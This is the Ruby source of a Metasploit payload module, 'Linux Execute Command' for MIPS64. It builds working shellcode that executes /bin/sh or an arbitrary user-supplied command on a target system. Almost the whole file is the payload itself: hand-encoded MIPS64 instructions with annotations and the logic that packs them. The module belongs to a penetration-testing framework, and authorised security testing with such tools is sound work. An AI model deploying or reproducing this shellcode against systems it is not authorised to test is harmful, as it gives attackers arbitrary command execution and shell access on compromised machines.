# -*- coding: binary -*-

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

# frozen_string_literal: true

module MetasploitModule
  CachedSize = 40

  include Msf::Payload::Single
  include Msf::Payload::Linux::Mips64::Prepends

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Linux Execute Command',
        'Description' => 'Execute an arbitrary command or just a /bin/sh shell',
        'Author' => [
          'Diego Ledda'
        ],
        'License' => MSF_LICENSE,
        'Platform' => 'linux',
        'Arch' => ARCH_MIPS64
      )
    )

    register_options([
      OptString.new('CMD', [ false, 'The command string to execute' ]),
    ])
  end

  def generate(_opts = {})
    cmd = datastore['CMD'] || ''

    if cmd.empty?
      # execve("/bin/sh", NULL, NULL)
      shellcode = [
        0x00001025, # move    v0, zero
        0x04510000, # bgezal  v0, myself
        0x00000000, # nop                         (delay slot)
        # myself: (ra = here)
        0x67e40014, # daddiu  a0, ra, 20           ; a0 = &"/bin/sh"
        0x00002825, # or      a1, zero, zero       ; a1 = NULL
        0x00003025, # or      a2, zero, zero       ; a2 = NULL
        0x240213c1, # addiu   v0, zero, 5057       ; __NR_execve (n64)
        0x0101010c  # syscall 0x40404
      ].pack('N*')
      shellcode += "/bin/sh\x00"
    else
      # execve("/bin/sh", ["/bin/sh", "-c", CMD, NULL], NULL)
      shellcode = [
        0x00001025, # move    v0, zero
        0x04510000, # bgezal  v0, myself
        0x00000000, # nop                         (delay slot)
        # myself: (ra = here)
        0x67bdffc0, # daddiu  sp, sp, -64          ; allocate stack space
        0x67e40030, # daddiu  a0, ra, 48           ; a0 = &"/bin/sh"
        0xffa40000, # sd      a0, 0(sp)            ; argv[0] = &"/bin/sh"
        0x67e80038, # daddiu  $8, ra, 56           ; $8 = &"-c"
        0xffa80008, # sd      $8, 8(sp)            ; argv[1] = &"-c"
        0x67e8003c, # daddiu  $8, ra, 60           ; $8 = &CMD
        0xffa80010, # sd      $8, 16(sp)           ; argv[2] = &CMD
        0xffa00018, # sd      zero, 24(sp)         ; argv[3] = NULL
        0x03a02825, # or      a1, sp, zero         ; a1 = argv
        0x00003025, # or      a2, zero, zero       ; a2 = NULL
        0x240213c1, # addiu   v0, zero, 5057       ; __NR_execve (n64)
        0x0101010c  # syscall 0x40404
      ].pack('N*')
      shellcode += "/bin/sh\x00"
      shellcode += "-c\x00\x00"
      shellcode += cmd + "\x00"
    end

    # align our shellcode to 4 bytes
    shellcode += "\x00" while shellcode.bytesize % 4 != 0

    super.to_s + shellcode
  end
end
